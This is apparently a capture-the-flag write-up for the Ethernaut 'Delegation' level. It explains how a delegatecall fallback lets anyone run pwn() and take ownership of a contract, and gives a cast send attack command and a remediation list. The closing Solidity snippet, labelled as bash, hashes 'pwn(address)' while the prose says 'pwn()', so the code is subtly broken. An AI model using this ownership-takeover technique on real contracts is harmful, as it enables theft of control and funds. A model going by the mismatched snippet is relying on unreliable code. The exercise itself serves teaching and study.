# Delegation

Claim ownership of the contract.

## Vulnerability

The `Delegate` contract has a function `pwn()` that allows anyone to change the owner of the contract. This is a critical vulnerability as it allows anyone to take over the contract.

The `Delegation` contract has a `fallback` function that uses `delegatecall` to the `Delegate` contract. The `delegatecall` function is dangerous because it executes code in the context of the calling contract, not the called contract. This means that if the `Delegate` contract's `pwn` function is called through the `Delegation` contract's `fallback` function, it will change the owner of the `Delegation` contract, not the `Delegate` contract.

## Attack

```bash
cast send $CONTRACT_ADDRESS 'pwn()' --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
```

## Fix

1. Remove the pwn function from the Delegate contract, or add access controls to ensure that only authorized users can change the owner.

2. Be very careful when using `delegatecall`, as it can lead to unexpected behavior. Consider using `call` instead, which executes code in the context of the called contract. If you must use `delegatecall`, make sure to thoroughly review the called contract to ensure it can't change critical state variables in the calling contract.

## General notes

In Ethereum, the `Application Binary Interface (ABI)` is a way to encode and decode data to and from the blockchain. It's used when calling functions in a contract and getting data back.

The `abi.encodeWithSelector` function is a part of the ABI. It encodes the function selector and the arguments for the function call. The function selector is a unique identifier for each function in a contract, and it's used to specify which function to call.

The function selector is calculated as the first four bytes of the `Keccak` hash of the function signature. The function signature is the function name followed by the types of its parameters, enclosed in parentheses. For he function signature of a function `pwn()` is simply `"pwn()"`.

`functionSignature` is the function selector of the pwn function. It's calculated as `bytes4(keccak256("pwn()"))`, which gives the first four bytes of the `Keccak` hash of the string `"pwn()"`.

When you call `abi.encodeWithSelector(functionSignature)`, it encodes this function selector into data that can be sent to the blockchain. This data is then used in the `call` function to call the `pwn` function on the `delegation` contract.

```bash
// Get the function signature of the pwn function
bytes4 functionSignature = bytes4(keccak256("pwn(address)"));

// Call the Delegation contract with the data of the pwn function
(bool success,) = address(delegation).call(abi.encodeWithSelector(functionSignature));
```
